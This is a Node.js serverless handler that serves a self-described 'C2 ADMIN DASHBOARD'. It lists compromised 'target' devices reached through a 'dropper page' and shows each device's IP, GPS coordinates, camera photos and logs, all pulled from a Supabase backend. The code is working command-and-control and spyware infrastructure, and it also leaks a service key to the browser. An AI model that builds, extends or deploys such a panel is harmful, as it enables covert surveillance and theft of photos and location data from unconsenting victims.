module.exports = async (req, res) => {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'text/html');

    try {
        // Get Supabase credentials from environment
        const supabaseUrl = process.env.SUPABASE_URL;
        const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_ANON_KEY;

        // Build the HTML with the credentials embedded (for the frontend to use)
        const html = `
<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;padding:20px}
        h1{color:#f7971e;margin-bottom:16px}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
        .card{background:#1a1a2e;border-radius:16px;padding:16px;border:1px solid #2a2a44}
        .card h3{color:#88ccff;margin-bottom:6px}
        .card .info{font-size:13px;color:#aab;line-height:1.6}
        .card .info .label{color:#4a6a7a}
        .btn{background:#f7971e;border:none;padding:6px 14px;border-radius:30px;color:#0a0a12;font-weight:600;cursor:pointer;margin-top:6px;font-size:12px}
        .btn:hover{transform:scale(1.02)}
        .log-area{background:#0b0b14;border-radius:12px;padding:8px;max-height:100px;overflow-y:auto;font-size:10px;line-height:1.5;border:1px solid #1a1a2a;margin-top:6px;font-family:'Courier New',monospace}
        .log-entry{border-bottom:1px solid #0f0f1a;padding:2px 0}
        .log-entry .time{color:#4a6a7a;margin-right:6px}
        .log-entry .lvl-info{color:#88ccff}
        .log-entry .lvl-warn{color:#ffaa44}
        .log-entry .lvl-error{color:#ff5e5e}
        .log-entry .lvl-success{color:#6fcf97}
        .refresh-btn{background:#2a2a44;border:none;padding:8px 20px;border-radius:60px;color:#e0e0e0;font-weight:600;cursor:pointer;margin-bottom:12px}
        .refresh-btn:hover{background:#3a3a5a}
        .stat-bar{display:flex;gap:20px;flex-wrap:wrap;background:#1a1a2e;padding:12px 20px;border-radius:60px;margin-bottom:16px;border:1px solid #2a2a44;font-size:14px}
        .stat-bar .stat .num{color:#f7971e;font-weight:700;font-size:18px}
        .error-box{background:#2a1a1a;border:1px solid #ff5e5e;border-radius:12px;padding:16px;color:#ff5e5e;margin-bottom:16px}
        .loading{color:#88ccff;font-size:16px}
    </style>
</head>
<body>
    <h1>☠️ C2 ADMIN DASHBOARD</h1>
    <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px;">
        <button class="refresh-btn" onclick="loadDevices()">🔄 Refresh</button>
        <span style="color:#4a6a7a;align-self:center;font-size:13px;">Auto-refreshes every 15s</span>
    </div>
    <div class="stat-bar" id="statBar">
        <div class="stat">📱 Devices: <span class="num" id="statDevices">0</span></div>
        <div class="stat">📸 Photos: <span class="num" id="statPhotos">0</span></div>
        <div class="stat">📍 Locations: <span class="num" id="statLocations">0</span></div>
        <div class="stat">📋 Logs: <span class="num" id="statLogs">0</span></div>
    </div>
    <div id="devices" class="grid"><div class="loading">⏳ Loading devices...</div></div>

    <script>
        // ============================================================
        //  SUPABASE CONFIG — injected from server
        // ============================================================
        const SUPABASE_URL = "${supabaseUrl || ''}";
        const SUPABASE_KEY = "${supabaseKey || ''}";

        // ============================================================
        //  HELPER: fetch from Supabase directly (no Vercel API calls)
        // ============================================================
        async function supabaseQuery(table, params = '') {
            if (!SUPABASE_URL || !SUPABASE_KEY) {
                throw new Error('Supabase credentials not configured');
            }
            const url = \`\${SUPABASE_URL}/rest/v1/\${table}?\${params}\`;
            const resp = await fetch(url, {
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': 'Bearer ' + SUPABASE_KEY
                }
            });
            if (!resp.ok) {
                throw new Error(\`HTTP \${resp.status}: \${resp.statusText}\`);
            }
            return resp.json();
        }

        // ============================================================
        //  LOAD DEVICES DIRECTLY FROM SUPABASE
        // ============================================================
        async function loadDevices() {
            const container = document.getElementById('devices');
            container.innerHTML = '<div class="loading">⏳ Loading...</div>';

            try {
                // Fetch all devices
                const devices = await supabaseQuery('devices', 'order=first_seen.desc');
                if (!devices || devices.length === 0) {
                    container.innerHTML = '<div class="error-box">⚠️ No devices registered yet. Open the dropper page on a target device.</div>';
                    document.getElementById('statDevices').textContent = '0';
                    return;
                }

                let totalPhotos = 0, totalLogs = 0, totalLocations = 0;
                container.innerHTML = '';

                for (const d of devices) {
                    // Fetch related data for each device
                    const [photos, logs, locations] = await Promise.all([
                        supabaseQuery('photos', 'device_id=eq.' + d.id + '&order=timestamp.desc&limit=10'),
                        supabaseQuery('logs', 'device_id=eq.' + d.id + '&order=timestamp.desc&limit=20'),
                        supabaseQuery('locations', 'device_id=eq.' + d.id + '&order=timestamp.desc&limit=5')
                    ]);

                    const photoCount = photos ? photos.length : 0;
                    const logCount = logs ? logs.length : 0;
                    const locCount = locations ? locations.length : 0;
                    totalPhotos += photoCount;
                    totalLogs += logCount;
                    totalLocations += locCount;

                    // Build photo grid
                    let photoHtml = '<div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px;">';
                    if (photoCount === 0) {
                        photoHtml += '<span style="color:#4a6a7a;font-size:11px;">No photos</span>';
                    } else {
                        photos.slice(0, 6).forEach(p => {
                            let imgUrl = '';
                            if (p.storage_path) {
                                imgUrl = \`\${SUPABASE_URL}/storage/v1/object/public/photos/\${p.storage_path}\`;
                            } else if (p.data_url && p.data_url.startsWith('data:image')) {
                                imgUrl = p.data_url;
                            }
                            if (imgUrl) {
                                photoHtml += \`<img src="\${imgUrl}" style="width:70px;height:70px;object-fit:cover;border-radius:8px;border:1px solid #2a2a44;cursor:pointer;" onclick="window.open('\${imgUrl}')" />\`;
                            }
                        });
                        if (photoCount > 6) {
                            photoHtml += \`<span style="color:#4a6a7a;font-size:11px;display:flex;align-items:center;">+\${photoCount - 6} more</span>\`;
                        }
                    }
                    photoHtml += '</div>';

                    // Build log preview
                    let logHtml = '<div class="log-area">';
                    if (logCount === 0) {
                        logHtml += '<span style="color:#4a6a7a;">No logs</span>';
                    } else {
                        logs.slice(0, 6).forEach(l => {
                            logHtml += \`<div class="log-entry"><span class="time">\${new Date(l.timestamp).toLocaleTimeString()}</span><span class="lvl-\${l.level || 'info'}">\${l.message || ''}</span></div>\`;
                        });
                    }
                    logHtml += '</div>';

                    const lastLoc = locations && locations.length > 0 ? locations[0] : null;

                    const card = document.createElement('div');
                    card.className = 'card';
                    card.innerHTML = \`
                        <h3>\${d.ip || 'Unknown IP'}</h3>
                        <div class="info">
                            <div><span class="label">Device:</span> \${d.platform || 'Unknown'}</div>
                            <div><span class="label">Screen:</span> \${d.screen || 'Unknown'}</div>
                            <div><span class="label">First seen:</span> \${new Date(d.first_seen).toLocaleString()}</div>
                            <div><span class="label">Last seen:</span> \${new Date(d.last_seen).toLocaleString()}</div>
                            \${lastLoc ? \`<div><span class="label">📍 Latest:</span> \${lastLoc.lat}, \${lastLoc.lon}</div>\` : ''}
                            <div><span class="label">📸 Photos:</span> \${photoCount} &nbsp;|&nbsp; <span class="label">📋 Logs:</span> \${logCount}</div>
                        </div>
                        \${photoHtml}
                        \${logHtml}
                        <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;">
                            <button class="btn" onclick="window.open('/api/photos?deviceId=\${d.id}')">📸 Photos</button>
                            <button class="btn" onclick="window.open('/api/logs?deviceId=\${d.id}')">📋 Logs</button>
                            <button class="btn" onclick="window.open('/api/locations?deviceId=\${d.id}')">📍 Locations</button>
                        </div>
                    \`;
                    container.appendChild(card);
                }

                document.getElementById('statDevices').textContent = devices.length;
                document.getElementById('statPhotos').textContent = totalPhotos;
                document.getElementById('statLogs').textContent = totalLogs;
                document.getElementById('statLocations').textContent = totalLocations;

            } catch (err) {
                container.innerHTML = \`<div class="error-box">❌ Error loading data: \${err.message}<br><br><strong>Check:</strong><br>1. Supabase URL and keys are set in Vercel environment variables<br>2. Supabase project is active<br>3. Tables exist (devices, photos, logs, locations)</div>\`;
                console.error('Dashboard error:', err);
            }
        }

        // Initial load
        loadDevices();
        setInterval(loadDevices, 15000);
    </script>
</body>
</html>
        `;

        res.status(200).send(html);

    } catch (err) {
        console.error('Dashboard render error:', err);
        res.status(500).send(`
            <!DOCTYPE html>
            <html>
            <head><title>Dashboard Error</title></head>
            <body style="background:#0a0a12;color:#e0e0e0;font-family:sans-serif;padding:40px;">
                <h1 style="color:#ff5e5e;">❌ Dashboard Failed to Load</h1>
                <p><strong>Error:</strong> ${err.message}</p>
                <p style="color:#aab;">Make sure your Supabase environment variables are set in Vercel.</p>
                <ul style="color:#aab;line-height:1.8;">
                    <li>SUPABASE_URL</li>
                    <li>SUPABASE_SERVICE_KEY or SUPABASE_ANON_KEY</li>
                </ul>
                <p style="color:#4a6a7a;margin-top:20px;">Check Vercel logs for more details.</p>
            </body>
            </html>
        `);
    }
};
